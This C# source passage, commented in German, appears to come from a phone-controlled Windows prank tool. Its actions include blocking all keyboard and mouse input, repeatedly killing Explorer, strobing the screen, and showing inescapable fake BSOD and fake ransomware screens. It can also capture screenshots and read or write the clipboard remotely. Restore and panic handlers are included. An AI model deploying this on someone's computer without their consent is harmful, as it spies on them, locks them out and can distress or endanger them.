            case "browserRefresh":Hotkey(Ctrl,0x52);break;case "browserHardRefresh":Hotkey(Ctrl,Shift,0x52);break;
            case "browserZoomIn":Hotkey(Ctrl,0x6B);break;case "browserZoomReset":Hotkey(Ctrl,0x30);break;
            case "mediaStop":Hotkey(0xB2);break;case "emojiPanel":Hotkey(Win,0xBE);break;case "snippingTool":Hotkey(Win,Shift,0x53);break;
            case "pasteClipboard":Hotkey(Ctrl,0x56);break;
            case "openExplorer":Hotkey(Win,0x45);QueuePresentation(0,"explorer");break;
            case "openCalculator":StartVisible(SystemExe("calc.exe"));break;case "openNotepad":StartVisible(SystemExe("notepad.exe"));break;
            case "openSettings":StartVisible("ms-settings:");break;
            case "winPSecond":restore.TryAdd("display",()=>Start(SystemExe("DisplaySwitch.exe"),"/extend"));Start(SystemExe("DisplaySwitch.exe"),"/external");break;
            case "secondScreenBack":Start(SystemExe("DisplaySwitch.exe"),"/extend");restore.Remove("display");break;
            case "stickyKeys":StickyKeys(true);break;case "stickyOff":StickyKeys(false);break;
            case "filterKeys":FilterKeys(true);break;case "filterOff":FilterKeys(false);break;
            case "mouseKeys":SetMouseKeys(true);break;case "mouseKeysOff":SetMouseKeys(false);break;
            case "narrator":
                // Hotkey Win+Ctrl+Enter schaltet Narrator UM - auf einem PC, wo
                // er schon laeuft, macht der Knopf ihn damit aus. Deshalb nur
                // starten, wenn er nicht laeuft; aus geht er ueber speechStop.
                if(!DryRun){
                    try{
                        if(Process.GetProcessesByName("Narrator").Length==0)
                            Process.Start(new ProcessStartInfo("narrator.exe"){UseShellExecute=true});
                    }catch{}
                }else Record("narrator");
                break;
            case "osk":Hotkey(Win,Ctrl,0x4F);break;
            case "magnifier":Hotkey(Win,0x6B);break;case "magnifierClose":Hotkey(Win,0x1B);break;
            case "printScreen":Hotkey(0x2C);break;case "highContrast":HighContrast();break;
            case "mouseSpeedMin":MouseSpeed(1);break;case "mouseSpeedNormal":MouseSpeed(10);break;
            case "swapButtons":Swap(true);break;case "swapButtonsOff":Swap(false);break;
            case "browserSearch":Hotkey(Ctrl,0x4C);Thread.Sleep(120);Type(text??"");Hotkey(0x0D);break;
            case "browserBack":Hotkey(Alt,0x25);break;case "reopenTab":Hotkey(Ctrl,Shift,0x54);break;
            case "closeTab":Hotkey(Ctrl,0x57);break;case "zoomOut":for(int n=0;n<6;n++)Hotkey(Ctrl,0x6D);break;
            case "history":Hotkey(Ctrl,0x48);break;case "downloads":Hotkey(Ctrl,0x4A);break;case "ytRestart":Hotkey(0x30);break;
            case "browserFullscreen":Hotkey(0x7A);break;
            case "mediaPlayPause":Hotkey(0xB3);break;case "mediaNext":Hotkey(0xB0);break;case "mediaPrev":Hotkey(0xB1);break;
            case "mediaMute":Hotkey(0xAD);break;case "volUp":Hotkey(0xAF);break;case "volDown":Hotkey(0xAE);break;
            case "launchApp":
                // Text aus der Seite hat Vorrang vor der gespeicherten Vorgabe,
                // sonst oeffnet der Knopf immer dasselbe Programm.
                Launch(!string.IsNullOrWhiteSpace(text)?text.Trim()!:(launcher??""));break;
            case "hideCursor":
                SetCursorVisible(false);
                break;
            case "showCursor":
                SetCursorVisible(true);
                break;
            case "speechLoop":
                // Laeuft ueber den Prozess-Handle in NativeWindows.Troll.cs:
                // nur so lässt sich die Schleife wieder zuverlaessig toeten.
                StartSpeechLoop(text ?? "");
                break;
            case "killExplorer":
                try{foreach(var p in Process.GetProcessesByName("explorer"))p.Kill();}catch{}
                break;
            case "restartExplorer":
                // Process.Start("explorer.exe") oeffnet nur ein Fenster, wenn
                // schon einer laeuft. Erst pruefen, dann starten.
                if(Process.GetProcessesByName("explorer").Length==0)
                    try{Process.Start(new ProcessStartInfo("explorer.exe"){UseShellExecute=true});}catch{}
                break;
            case "blackout":
                ShowOverlay("screenBlank",null,0);
                break;
            case "freezeInput":
                BlockInput(true);
                restore.TryAdd("input",()=>BlockInput(false));
                break;
            case "unfreezeInput":
                BlockInput(false);
                restore.Remove("input");
                break;
            case "volumeMax":
                for(int i=0;i<50;i++)Hotkey(0xAF);
                break;
            case "openCmd":
                StartVisible(SystemExe("cmd.exe"));
                break;
            case "selfDestruct":
                SelfDestruct();
                break;
            case "cursorGiant": SetCursorBaseSize(96); break;
            case "cursorNormal": SetCursorBaseSize(32); break;
            case "monitorOff": SendMessage((IntPtr)0xFFFF, 0x0112, (IntPtr)0xF170, (IntPtr)2); break;
            case "monitorOn":
                Move(1,1); Move(-1,-1);
                break;
            case "iconsHide": DesktopIcons(false); break;
            case "iconsShow": DesktopIcons(true); break;
            case "winHold": KeyboardHold(Win, true); break;
            case "winRelease": KeyboardHold(Win, false); break;
            case "altTabSpam": for(int i=0;i<8;i++){ Hotkey(Alt,0x09); Thread.Sleep(180);} break;
            case "clipboardClear": Stable(()=>{ Clipboard.Clear(); return 0; }); break;
            case "taskView": Hotkey(Win,0x09); break;
            case "typeSpam": for(int i=0;i<20;i++){ Type(text??"6767"); Thread.Sleep(250);} break;
            case "releaseKeys": ReleaseDanceKeys(); KeyboardHold(Win,false); KeyboardHold(Ctrl,false); KeyboardHold(Alt,false); KeyboardHold(Shift,false); break;
            case "mouseWarpCorner": SetCursorPos(0,0); break;
            case "openRegedit": StartVisible(SystemExe("regedit.exe")); break;
            case "openControlPanel": StartVisible(SystemExe("control.exe")); break;
            case "openEventViewer": StartVisible(SystemExe("eventvwr.msc")); break;
            case "openPowerShell": StartVisible(SystemExe("WindowsPowerShell\\v1.0\\powershell.exe")); break;
            case "openDeviceManager": StartVisible(SystemExe("devmgmt.msc")); break;
            case "cursorBig": SetCursorBaseSize(48); break;
            case "screensaverNow": SendMessage((IntPtr)0xFFFF, 0x0112, (IntPtr)0xF140, IntPtr.Zero); break;
            case "keepAwake": KeepAwake(true); break;
            case "keepAwakeOff": KeepAwake(false); break;
            case "openDownloadsFolder": StartVisible("shell:Downloads"); break;
            case "openTempFolder": StartVisible("shell:temp"); break;
            case "setSound": StartVisible("ms-settings:sound"); break;
            case "setDisplay": StartVisible("ms-settings:display"); break;
            case "setBluetooth": StartVisible("ms-settings:bluetooth"); break;
            case "setNetwork": StartVisible("ms-settings:network"); break;
            case "setPrivacy": StartVisible("ms-settings:privacy"); break;
            case "setApps": StartVisible("ms-settings:appsfeatures"); break;
            case "setUpdate": StartVisible("ms-settings:windowsupdate"); break;
            case "setAbout": StartVisible("ms-settings:about"); break;
            case "setPrinters": StartVisible("ms-settings:printers"); break;
            case "setTaskbar": StartVisible("ms-settings:taskbar"); break;
            case "setDateTime": StartVisible("ms-settings:dateandtime"); break;
            case "setPower": StartVisible("ms-settings:powersettings"); break;
            case "setNotifications": StartVisible("ms-settings:notifications"); break;
            case "taskbarAutoHide":
                SetTaskbar(true);
                break;
            case "taskbarRestore":
                SetTaskbar(false);
                break;
            case "magnifierInvert":
                Hotkey(Win, Ctrl, 0x49);   // Win+Strg+I
                break;
            case "wallpaperTroll":
                Wallpaper(true);
                break;
            case "wallpaperRestore":
                Wallpaper(false);
                break;
            case "rickroll":
                try{Process.Start(new ProcessStartInfo("https://www.youtube.com/watch?v=dQw4w9WgXcQ"){UseShellExecute=true});}catch{}
                break;
            case "capsSpam":
                for(int i=0;i<12;i++){Hotkey(0x14);Thread.Sleep(160);}
                break;
            case "mouseShake":
                for(int i=0;i<48;i++)
                {
                    double a=i*Math.PI/6.0;
                    Move((int)(Math.Cos(a)*22),(int)(Math.Sin(a)*22));
                    Thread.Sleep(45);
                }
                break;
            case "numLockParty":
                for(int i=0;i<10;i++){Hotkey(0x90);Thread.Sleep(180);}
                break;
            case "volumeParty":
                for(int i=0;i<6;i++){for(int n=0;n<8;n++)Hotkey(0xAF);Thread.Sleep(220);for(int n=0;n<8;n++)Hotkey(0xAE);Thread.Sleep(220);}
                break;
            case "tabSpam":
                for(int i=0;i<8;i++){Hotkey(Ctrl,0x54);Thread.Sleep(120);}
                break;
            // ---- neue Streiche (Build 7) -------------------------------
            case "explorerLoop":
                {
                    int sec = seconds > 0 ? Math.Clamp(seconds, 5, 180) : 25;
                    Task.Run(() =>
                    {
                        long until = Environment.TickCount64 + sec * 1000L;
                        while (Environment.TickCount64 < until)
                        {
                            foreach (var p in Process.GetProcessesByName("explorer")) { try { p.Kill(); } catch { } p.Dispose(); }
                            Thread.Sleep(1100);
                            try { Process.Start(new ProcessStartInfo("explorer.exe") { UseShellExecute = true })?.Dispose(); } catch { }
                            Thread.Sleep(1400);
                        }
                    });
                    break;
                }
            case "wallpaperForce": SetWallpaperFromBase64(text ?? ""); break;
            case "wallpaperSpam": WallpaperSpam(seconds); break;
            case "taskbarHide": SetTaskbarVisible(false); break;
            case "taskbarShow": SetTaskbarVisible(true); break;
            case "taskbarTiny": SetTaskbarSmallIcons(true); break;
            case "taskbarTinyOff": SetTaskbarSmallIcons(false); break;
            case "startMenuBreak": BreakStartMenu(seconds); break;
            case "startMenuFix": FixStartMenu(); break;
            case "mouseMoveAbs": MoveMouseTo(text ?? ""); break;
            case "mousePath": PlayMousePath(text ?? "", seconds); break;
            case "strobe": StartStrobe(seconds); break;
            case "strobeOff": StopStrobe(); break;
            case "mirrorH": StartMirror(true, false); break;
            case "mirrorV": StartMirror(false, true); break;
            case "mirrorHV": StartMirror(true, true); break;
            case "mirrorOff": StopMirror(); break;
            case "keyDelayOn": SetKeyDelay(int.TryParse(text, out var kd) ? Math.Clamp(kd, 40, 3000) : 350); break;
            case "keyDelayOff": SetKeyDelay(0); break;
            case "beepOnKey": SetBeepOnKey(true); break;
            case "beepOff": SetBeepOnKey(false); break;
            case "slowType":
                {
                    string body = text ?? "";
                    int gap = seconds > 0 ? Math.Clamp(seconds, 20, 2000) : 150;
                    Task.Run(() => { foreach (char ch in body) { try { Type(ch.ToString()); } catch { } Thread.Sleep(gap); } });
                    break;
                }
            case "windowJiggle": JiggleForegroundWindow(seconds); break;
            case "windowCascade": CascadeWindows(); break;
            case "titleRename": RenameForegroundWindow(text ?? ""); break;
            case "speechStop": StopSpeech(); break;
            case "clockWrong": SetClock(text ?? ""); break;
            case "clockFix": Start(SystemExe("w32tm.exe"), "/resync"); CloseOverlay("desktopClock"); break;
            case "clickJump": SetClickJump(true); break;
            case "clickJumpOff": SetClickJump(false); break;
            case "ping":case "stopAll":break;
            default:throw new InvalidOperationException("Unbekannte Aktion.");
        }
    }
    [DllImport("user32.dll")] private static extern int ShowCursor(bool show);
    [DllImport("user32.dll")] [return:MarshalAs(UnmanagedType.Bool)] private static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)]bool fBlockIt);
    public void StickyKeys(bool enabled)
    {
        var v=new Sticky{size=8};Check(SpiSticky(58,8,ref v,0));var original=v;
        restore.TryAdd("sticky",()=>Check(SpiSticky(59,8,ref original,2)));
        v.flags=enabled?v.flags|1:v.flags&~1u;Check(SpiSticky(59,8,ref v,2));
    }
    public void FilterKeys(bool enabled)
    {
        var v=new Filter{size=24};Check(SpiFilter(50,24,ref v,0));var original=v;
        restore.TryAdd("filter",()=>Check(SpiFilter(51,24,ref original,2)));
        v.flags=enabled?v.flags|1:v.flags&~1u;if(enabled){v.wait=2000;v.delay=500;v.repeat=500;v.bounce=0;}
        Check(SpiFilter(51,24,ref v,2));var check=new Filter{size=24};Check(SpiFilter(50,24,ref check,0));
        if(((check.flags&1)!=0)!=enabled)throw new InvalidOperationException("Windows hat Filter Keys nicht übernommen.");
    }
    public void SetMouseKeys(bool enabled)
    {
        var v=new MouseKeys{size=28};Check(SpiMouse(54,28,ref v,0));var original=v;
        restore.TryAdd("mouseKeys",()=>Check(SpiMouse(55,28,ref original,2)));
        v.flags=enabled?v.flags|1:v.flags&~1u;Check(SpiMouse(55,28,ref v,2));
    }
    private void MouseSpeed(int speed)
    {
        int original=0;Check(SpiInt(112,0,ref original,0));restore.TryAdd("speed",()=>Check(SpiPtr(113,0,(IntPtr)original,2)));
        Check(SpiPtr(113,0,(IntPtr)speed,2));
    }
    private void Swap(bool swapped)
    {
        int original=GetSystemMetrics(23);restore.TryAdd("swap",()=>Check(SpiPtr(33,(uint)original,IntPtr.Zero,2)));
        Check(SpiPtr(33,swapped?1u:0u,IntPtr.Zero,2));
    }
    private void HighContrast()
    {
        var v=new Contrast{size=(uint)Marshal.SizeOf<Contrast>()};Check(SpiContrast(66,v.size,ref v,0));var flags=v.flags;
        // The scheme pointer returned by GET is owned by Windows. Do not retain it.
        restore.TryAdd("contrast",()=>{var x=new Contrast{size=(uint)Marshal.SizeOf<Contrast>(),flags=flags};Check(SpiContrast(67,x.size,ref x,2));});
        v.flags^=1;Check(SpiContrast(67,v.size,ref v,2));
    }
    public void Restore()
    {
        // Erst alles, was als Hook, Fenster oder Effekt laeuft - sonst blockiert
        // ein Hook das Aufraeumen oder eine gesperrte Anzeige bleibt stehen.
        try{CloseEffects();}catch{}
        SetDance(false);CancelExplorerBurst();CloseOverlays();presentations.Clear();
        var errors=new List<string>();foreach(var pair in restore.ToArray())try{pair.Value();restore.Remove(pair.Key);}catch{errors.Add(pair.Key);}
        if(errors.Count>0)throw new InvalidOperationException("Zurücksetzen fehlgeschlagen: "+string.Join(", ",errors)+". Bitte am PC prüfen.");
    }
    public static void ProbeSettings()
    {
        // Read-only verification of real Windows structure sizes/API constants.
        var s=new Sticky{size=8};Check(SpiSticky(58,8,ref s,0));
        var f=new Filter{size=24};Check(SpiFilter(50,24,ref f,0));
        var m=new MouseKeys{size=28};Check(SpiMouse(54,28,ref m,0));
        var c=new Contrast{size=(uint)Marshal.SizeOf<Contrast>()};Check(SpiContrast(66,c.size,ref c,0));
        int speed=0;Check(SpiInt(112,0,ref speed,0));_ =GetSystemMetrics(23);
    }
    public void Beep() { if(DryRun){Record("beep");return;}Task.Run(()=>{try{Console.Beep(800,180);}catch{};}); }
    internal static readonly HashSet<string> OverlayActions=new(){"fakeBsod","fakeUpdate","showMessage","screenBlank","desktopClock","countdown","screenColor","fakeRansom"};
    private readonly HashSet<string> simulatedOverlays=new();
    public IReadOnlyCollection<string> ActiveOverlays=>DryRun?simulatedOverlays.ToArray():OverlayIds;
    public void CloseOverlay(string id)
    {
        simulatedOverlays.Remove(id);
        RemoteOverlay? form = null;
        lock (overlayLock) { if (overlays.Remove(id, out var f)) form = f; }
        if (form is null) return;
        // Schliessen muss auf dem Thread passieren, dem das Fenster gehoert.
        try { OnUi(() => { form.AllowClose = true; form.Close(); }); }
        catch { try { form.AllowClose = true; form.Close(); } catch { } }
    }
    public void CloseOverlays(){foreach(var id in ActiveOverlays.ToArray())CloseOverlay(id);}
    private readonly object overlayLock = new();
    internal static string CountdownText(long deadline,long now)
    {var remaining=Math.Max(0,(deadline-now+999)/1000);return remaining==0?"Zeit abgelaufen!":TimeSpan.FromSeconds(remaining).ToString(@"mm\:ss");}
    private void ShowOverlay(string id,string? text,int seconds)
    {
        CheckDesktop();CloseOverlay(id);
        if(DryRun){simulatedOverlays.Add(id);return;}
        var title=id switch{"fakeBsod"=>"","fakeUpdate"=>"","showMessage"=>"Nachricht vom Handy","screenBlank"=>"Schwarzer Bildschirm","desktopClock"=>"Uhr","countdown"=>"Countdown","fakeRansom"=>"",_=>"Monitor-Farbtest"};
        var color=id=="fakeBsod"?Color.FromArgb(0,120,215):id=="fakeUpdate"?Color.FromArgb(0,120,215):id=="fakeRansom"?Color.FromArgb(20,0,0):Color.FromArgb(12,17,26);
        if(id=="screenColor")color=text switch{"red"=>Color.DarkRed,"green"=>Color.DarkGreen,"blue"=>Color.DarkBlue,"white"=>Color.White,"black"=>Color.Black,_=>throw new InvalidOperationException("Ungültige Testfarbe.")};
        var until=Environment.TickCount64+seconds*1000L;
        Func<string>? update=id=="desktopClock"?()=>DateTime.Now.ToString("HH:mm:ss\ndddd, dd. MMMM"):id=="countdown"?()=>CountdownText(until,Environment.TickCount64):null;
        var body=id=="fakeBsod"?":(\n\nDein PC hat ein Problem festgestellt und muss neu gestartet werden.\nWir sammeln gerade einige Fehlerinformationen und starten dann neu.\n\n0% abgeschlossen\n\nWeitere Informationen zu diesem Problem und moegliche Loesungen:\nhttps://www.windows.com/stopcode\n\nWenn du einen Supportmitarbeiter anrufst, gib ihm diese Info:\nStop-Code: CRITICAL_PROCESS_DIED\n\nWenn du das hier liest: du bist im falschen Film."
            :id=="fakeUpdate"?"Wird vorbereitet\n\n\n\nBitte den PC nicht ausschalten. Das dauert eine Weile.\n\n\n1% abgeschlossen\n\nDer PC wird mehrmals neu gestartet."
            :id=="fakeRansom"?"DEINE DATEIEN SIND VERSCHLUESSELT\n\nAlle Dokumente, Bilder und Projekte auf diesem PC wurden mit AES-256\nverschluesselt. Der Schluessel liegt auf einem Server, den nur wir kennen.\n\nWas passiert ist:\n  - 18.412 Dateien verschluesselt\n  - Sicherungskopien ueberschrieben\n  - Wiederherstellung deaktiviert\n\nUm die Dateien zurueckzubekommen, ueberweise 0,01337 BTC an die Adresse\nunten und schicke die ID per Mail. Nach 72 Stunden wird der Schluessel\ngeloescht.\n\nBTC: bc1q-easter-egg-kein-echter-schluessel-6767\nID:  CH-"+(text??"0000")+"\n\n(Das ist eine Attrappe. Nichts auf diesem PC ist verschluesselt.\n Der einzige Weg hier raus ist die Fernbedienung.)"
            :id=="showMessage"?text??"":id is "desktopClock" or "countdown"?update!():"";
        var lifetime=id switch{"fakeBsod"=>0,"fakeUpdate"=>0,"showMessage"=>15,"screenBlank"=>0,"screenColor"=>30,"desktopClock"=>120,"countdown"=>seconds+5,"fakeRansom"=>0,_=>0};
        var form=new RemoteOverlay(title,body,color,lifetime,update,lockdown:id is "fakeBsod" or "fakeUpdate" or "screenBlank" or "fakeRansom");if(id=="screenColor"&&text=="white")form.ForeColor=Color.Black;
        lock(overlayLock)overlays[id]=form;
        form.FormClosed+=(_,_)=>{lock(overlayLock){if(overlays.GetValueOrDefault(id)==form)overlays.Remove(id);}};
        // Fenster entstehen auf dem UI-Thread: nur dort laufen Timer und
        // Neuzeichnen. Von hier aus gesehen ist Show() damit synchron.
        OnUi(() =>
        {
            form.Show();
            if(id is "fakeBsod" or "fakeUpdate" or "screenBlank")
            {
                form.WindowState=FormWindowState.Maximized;
                form.Bounds=Screen.PrimaryScreen?.Bounds??form.Bounds;
                form.TopMost=true;
                form.BringToFront();
                form.Activate();
            }
        });
    }
    public object Screens()=>DryRun?new[]{new{id=0,label="Bildschirm 1 · 320 × 180"},new{id=1,label="Bildschirm 2 · 320 × 180"}}:
        Screen.AllScreens.Select((s,i)=>new{id=i,label=$"Bildschirm {i+1} · {s.Bounds.Width} × {s.Bounds.Height}{(s.Primary?" · Hauptbildschirm":"")}"}).ToArray();
    public byte[] Screenshot(int screen=0,int maxWidth=1280)
    {
        if(screen<0||screen>=(DryRun?2:Screen.AllScreens.Length))throw new InvalidOperationException("Bildschirm nicht verfügbar.");
        CheckDesktop();var bounds=DryRun?new Rectangle(0,0,320,180):Screen.AllScreens[screen].Bounds;
        using var bitmap=new Bitmap(bounds.Width,bounds.Height);using var g=Graphics.FromImage(bitmap);
        if(DryRun)g.Clear(Color.FromArgb(15,25,40));else g.CopyFromScreen(bounds.Location,Point.Empty,bounds.Size);
        var width=Math.Min(maxWidth,bitmap.Width);using var scaled=new Bitmap(bitmap,new Size(width,Math.Max(1,bitmap.Height*width/bitmap.Width)));
        using var stream=new MemoryStream();scaled.Save(stream,ImageFormat.Jpeg);return stream.ToArray();
    }
    private delegate bool EnumCallback(IntPtr window,IntPtr data);
    [DllImport("user32.dll")] private static extern bool EnumWindows(EnumCallback callback,IntPtr data);
    [DllImport("user32.dll")] private static extern bool IsWindowVisible(IntPtr window);
    [DllImport("user32.dll",CharSet=CharSet.Unicode)] private static extern int GetWindowText(IntPtr window,System.Text.StringBuilder text,int count);
    [DllImport("user32.dll")] private static extern uint GetWindowThreadProcessId(IntPtr window,out uint process);
    [DllImport("user32.dll")] private static extern bool ShowWindowAsync(IntPtr window,int command);
    [DllImport("user32.dll")] private static extern bool SetForegroundWindow(IntPtr window);
    [DllImport("user32.dll")] private static extern bool IsIconic(IntPtr window);
    [DllImport("user32.dll")] private static extern IntPtr GetShellWindow();
    internal sealed record WindowInfo(string id,string title);
    private readonly Dictionary<string,(IntPtr Handle,uint Pid,long Expires)> windows=new();
    public WindowInfo[] Windows()
    {
        CheckDesktop();if(DryRun)return new[]{new WindowInfo("test-window","Testfenster <script>" )};
        var now=Environment.TickCount64;foreach(var key in windows.Where(x=>x.Value.Expires<now).Select(x=>x.Key).ToArray())windows.Remove(key);
        var result=new List<WindowInfo>();var shell=GetShellWindow();using var ownProcess=Process.GetCurrentProcess();var ownSession=ownProcess.SessionId;
        EnumWindows((h,_)=>
        {
            if(!IsWindowVisible(h)||h==shell)return true;
            GetWindowThreadProcessId(h,out var pid);if(pid==(uint)Environment.ProcessId||pid==0)return true;
            var title=new System.Text.StringBuilder(512);if(GetWindowText(h,title,512)==0)return true;
            try{using var process=Process.GetProcessById((int)pid);if(process.SessionId!=ownSession)return true;}catch{return true;}
            var id=windows.FirstOrDefault(x=>x.Value.Handle==h&&x.Value.Pid==pid).Key??Guid.NewGuid().ToString("N");
            windows[id]=(h,pid,now+60000);result.Add(new(id,title.ToString()));return result.Count<128;
        },IntPtr.Zero);
        // Drop closed windows immediately, including obsolete handles.
        foreach(var key in windows.Keys.Except(result.Select(w=>w.id)).ToArray())windows.Remove(key);
        return result.ToArray();
    }
    public void WindowAction(string action,string id)
    {
        if(DryRun){if(id!="test-window")throw new InvalidOperationException("Fenster nicht mehr verfügbar.");Record(action);return;}
        CheckDesktop();
        if(!windows.TryGetValue(id,out var target)||target.Expires<Environment.TickCount64||!IsWindowVisible(target.Handle))throw new InvalidOperationException("Fensterliste bitte aktualisieren.");
        GetWindowThreadProcessId(target.Handle,out var pid);if(pid!=target.Pid)throw new InvalidOperationException("Fenster nicht mehr verfügbar.");
        if(action=="windowFocus")
        {if(IsIconic(target.Handle))ShowWindowAsync(target.Handle,9);if(!SetForegroundWindow(target.Handle))throw new InvalidOperationException("Windows erlaubt den Fokuswechsel gerade nicht. Am PC das Fenster auswählen.");}
        else if(!ShowWindowAsync(target.Handle,action=="windowMinimize"?6:action=="windowMaximize"?3:9))throw new InvalidOperationException("Fenster konnte nicht geändert werden.");
    }
    // Zwischenablage geht nur auf einem STA-Thread. Der Relay-Dispatcher
    // laeuft auf einem ThreadPool-Thread (MTA) - dort wirft Clipboard.SetText
    // eine ThreadStateException, und der Befehl kam nie an. Deshalb hier ein
    // eigener STA-Thread mit Zeitlimit.
    private static T Stable<T>(Func<T> work)
    {
        T result = default!;
        Exception? err = null;
        var t = new Thread(() => { try { result = work(); } catch (Exception ex) { err = ex; } });
        t.SetApartmentState(ApartmentState.STA);
        t.IsBackground = true;
        t.Start();
        if (!t.Join(4000)) throw new TimeoutException("Zwischenablage antwortet nicht.");
        if (err is not null) throw err;
        return result;
    }

    public object ReadClipboard()
    {
        if(DryRun)return new{text="Test-Zwischenablage"};
        return Stable<object>(() =>
        {
            var text=Clipboard.ContainsText()?Clipboard.GetText():"";
            if(text.Length>4096)text=text.Substring(0,4096)+" ...";
            return new{text};
        });
    }
    public void WriteClipboard(string text)
    {
        if(DryRun){Record("clipboardWrite");return;}
        Stable(() => { if(text.Length==0)Clipboard.Clear();else Clipboard.SetText(text);return 0; });
    }
    public object Stats()
    {
        GetSystemTimes(out var idle,out var kernel,out var user);var total=(kernel.Value-lastKernel)+(user.Value-lastUser);var idleDiff=idle.Value-lastIdle;
        var cpu=total==0?0:Math.Clamp((int)(100-100*idleDiff/total),0,100);lastIdle=idle.Value;lastKernel=kernel.Value;lastUser=user.Value;
        var mem=new MemoryInfo{length=(uint)Marshal.SizeOf<MemoryInfo>()};Check(GlobalMemoryStatusEx(ref mem));
        var t=TimeSpan.FromMilliseconds(GetTickCount64());return new{name=Environment.MachineName,cpu,memory=mem.load,uptime=$"{(int)t.TotalHours} h {t.Minutes} min"};
    }
}

internal sealed class RemoteOverlay:Form
{
    private readonly System.Windows.Forms.Timer? tick;
    private readonly bool lockdown;
    private readonly Label bodyLabel;
    private readonly Func<string>? updater;
    private readonly Func<long>? clock;
    private readonly int lifetimeSeconds;
    private readonly long createdAt;
    private long _completedAt;
    // Ohne das laesst sich eine gesperrte Anzeige (Bluescreen, Ransom, Blackout)
    // auch von der Fernbedienung nicht schliessen - FormClosing cancelt jedes
    // Close(). Der Panik-Knopf muss aber immer durchkommen.
    public bool AllowClose { get; set; }
    public string DisplayText => bodyLabel.Text;
    // Ein Zeichenweg fuer Fenster und Vorschau. Vorher zeichnete die Vorschau
    // mit DrawString und das Fenster ueber ein Label - deshalb war die Anzeige
    // auf dem Schirm leer, waehrend der SelfTest ein Bild bekam.
    private void DrawContent(Graphics g,Rectangle bounds)
    {
        g.Clear(BackColor);
        var text=bodyLabel.Text;
        if(string.IsNullOrEmpty(text))return;
        var pad=bodyLabel.Padding;
        var rect=new Rectangle(bounds.Left+pad.Left,bounds.Top+pad.Top,
            Math.Max(1,bounds.Width-pad.Horizontal),Math.Max(1,bounds.Height-pad.Vertical));
        TextRenderer.DrawText(g,text,bodyLabel.Font,rect,ForeColor,
            TextFormatFlags.WordBreak|TextFormatFlags.NoPrefix|TextFormatFlags.VerticalCenter|TextFormatFlags.Left);
    }
    protected override void OnPaint(PaintEventArgs e)=>
        DrawContent(e.Graphics,new Rectangle(Point.Empty,ClientSize));
    public RemoteOverlay(string title,string body,Color back,int lifetimeSeconds=0,Func<string>? update=null,Func<long>? clock=null,bool lockdown=false)
    {
        this.lockdown=lockdown;
        this.updater=update;
        this.clock=clock;
        this.lifetimeSeconds=lifetimeSeconds;
        // SelfTests inject clock and pass a synthetic "now" via that clock; seed createdAt from first clock read if present
        createdAt = clock is not null ? clock() : Environment.TickCount64;
        Text=string.IsNullOrEmpty(title)?" ":title;
        FormBorderStyle=FormBorderStyle.None;
        WindowState=FormWindowState.Maximized;
        TopMost=true;
        ShowInTaskbar=false;
        StartPosition=FormStartPosition.Manual;
        Bounds=Screen.PrimaryScreen?.Bounds??new Rectangle(0,0,1920,1080);
        BackColor=back;
        ForeColor=Color.White;
        KeyPreview=true;
        ControlBox=false;
        MaximizeBox=false;
        MinimizeBox=false;
        bodyLabel=new Label{
            // Nicht in Controls: der Text wird in OnPaint gezeichnet. Ein Label
            // mit Dock=Fill hat schon zweimal die Anzeige leergelassen (blauer
            // Schirm ohne Text) - TextRenderer haengt an keiner Layout-Logik.
            AutoSize=false,
            TextAlign=ContentAlignment.MiddleLeft,
            Font=new Font("Segoe UI",lockdown?28f:18f,FontStyle.Regular),
            Padding=new Padding(80,60,80,60),
            ForeColor=Color.White,
            BackColor=Color.Transparent,
            Text=body
        };
        DoubleBuffered=true;
        if(update is not null && clock is null)
        {
            tick=new System.Windows.Forms.Timer{Interval=250};
            tick.Tick+=(_,_)=>{try{bodyLabel.Text=update();Invalidate();}catch{}};
            tick.Start();
        }
        if(lifetimeSeconds>0 && clock is null)
        {
            var close=new System.Windows.Forms.Timer{Interval=lifetimeSeconds*1000};
            close.Tick+=(_,_)=>{close.Stop();Close();};
            close.Start();
        }
        if(lockdown)
        {
            FormClosing+=(_,e)=>{if(!AllowClose&&e.CloseReason!=CloseReason.ApplicationExitCall)e.Cancel=true;};
            KeyDown+=(_,e)=>{e.Handled=true;e.SuppressKeyPress=true;};
            Deactivate+=(_,_)=>{try{Activate();BringToFront();TopMost=true;}catch{}};
            LostFocus+=(_,_)=>{try{Activate();BringToFront();}catch{}};
            var hold=new System.Windows.Forms.Timer{Interval=400};
            hold.Tick+=(_,_)=>{try{if(!IsDisposed){TopMost=true;BringToFront();if(!Focused)Activate();}}catch{}};
            hold.Start();
            FormClosed+=(_,_)=>hold.Stop();
        }
        else
        {
            KeyDown+=(_,e)=>{if(e.KeyCode==Keys.Escape)Close();};
        }
    }
    /// <summary>Used by SelfTests with an injectable clock.</summary>
    public bool RefreshDisplay()
    {
        if(IsDisposed) return false;
        if(updater is not null)
        {
            try { bodyLabel.Text = updater(); } catch {}
        }
        if(lifetimeSeconds > 0 && clock is not null)
        {
            var now = clock();
            if(bodyLabel.Text.Contains("abgelaufen", StringComparison.OrdinalIgnoreCase))
            {
                if(_completedAt == 0) _completedAt = now;
                if(now - _completedAt >= 5000) { Close(); return false; }
            }
            else if(now >= createdAt + lifetimeSeconds * 1000L)
            {
                // lifetime elapsed without completion text path
                Close();
                return false;
            }
        }
        return !IsDisposed;
    }
    public Bitmap RenderPreview()
    {
        var w = Math.Max(1, Width > 0 ? Width : Math.Max(Bounds.Width, 400));
        var h = Math.Max(1, Height > 0 ? Height : Math.Max(Bounds.Height, 225));
        if(w > 400) { h = Math.Max(1, h * 400 / w); w = 400; }
        var bmp = new Bitmap(w, h);
        bmp.SetResolution(96,96);
        using var g = Graphics.FromImage(bmp);
        // Massstab 1:1 auf die Vorschau: dieselbe Zeichenroutine wie OnPaint,
        // nur mit kleinerem Rand, damit im 400-px-Bild noch Text steht.
        var scale = Math.Min(1f, w / 1200f);
        using var previewFont = new Font(bodyLabel.Font.FontFamily, Math.Max(7f, bodyLabel.Font.Size * Math.Max(scale, 0.45f)), bodyLabel.Font.Style);
        g.Clear(BackColor);
        var pad = new Padding(8,5,8,5);
        var rect = new Rectangle(pad.Left,pad.Top,Math.Max(1,w-pad.Horizontal),Math.Max(1,h-pad.Vertical));
        var text = bodyLabel.Text;
        if(text.Length > 0)
            TextRenderer.DrawText(g,text,previewFont,rect,ForeColor,
                TextFormatFlags.WordBreak|TextFormatFlags.NoPrefix|TextFormatFlags.VerticalCenter|TextFormatFlags.Left);
        return bmp;
    }
    protected override CreateParams CreateParams
    {
        get
        {
            var cp = base.CreateParams;
            if(lockdown) cp.ExStyle |= 0x80;
            return cp;
        }
    }
